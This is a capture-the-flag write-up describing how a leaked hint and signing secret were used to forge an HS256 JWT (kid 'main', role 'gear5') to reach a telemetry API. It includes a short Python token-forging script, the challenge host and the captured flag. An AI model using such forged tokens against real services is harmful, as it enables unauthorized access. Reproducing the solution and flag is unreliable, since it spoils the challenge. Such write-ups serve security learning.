# CTF Write-up: JWT Forgery and API Exploitation

## Challenge Summary
The challenge provided a hint in the `/cam-feed/` source code:
```javascript
// Who knew a Mushi could log credentials? Try jwt 'kid' = 'main'
// X-JOY-AUTH: NIKA-NIKA-NO-MI
```
Additionally, a Swagger endpoint was exposed:
```
https://ggggfajajs.onrender.com/swagger-joyboy
```
From this, various API endpoints were found, most of which were restricted. However, the following endpoint stood out:
```
https://ggggfajajs.onrender.com/api/system/telemetry
```
This endpoint returned an error message indicating that a JWT token was required.

## Exploitation Steps
### Step 1: Crafting the JWT Token
To access the telemetry API, a JWT token was needed. Based on the hint, we set the `kid` (Key ID) to `main` and initially tried signing it with a random secret key. However, this resulted in an error:
```
Signature verification failed
```
### Step 2: Using the Provided Secret Key
From the source code hint, we noticed `X-JOY-AUTH: NIKA-NIKA-NO-MI`. Using this as the signing key, we generated a new JWT token. However, upon using it, we received:
```
You are not ready for Gear 5.
```
### Step 3: Understanding "Gear 5"
A quick search on "Gear 5" led to the understanding that it refers to the 5th transformation of Luffy in *One Piece*. Based on this, we assumed the token payload needed a parameter related to "gear5".

### Step 4: Modifying the Payload
We modified the JWT payload by adding:
```json
{"role": "gear5"}
```
This time, the request was successfully accepted, and we received the flag!

## Tools Used
Python script for JWT forging:
```python
import jwt

# JWT Header
header = {
    "alg": "HS256",
    "typ": "JWT",
    "kid": "main"
}

# JWT Payload
payload = {"role": "gear5"}

# Secret Key
secret = "NIKA-NIKA-NO-MI"

# Generate JWT
token = jwt.encode(payload, secret, algorithm="HS256", headers=header)
print(token)
```

## Conclusion
Flag: HICA{gear5_awakening_joyboy_legacy}
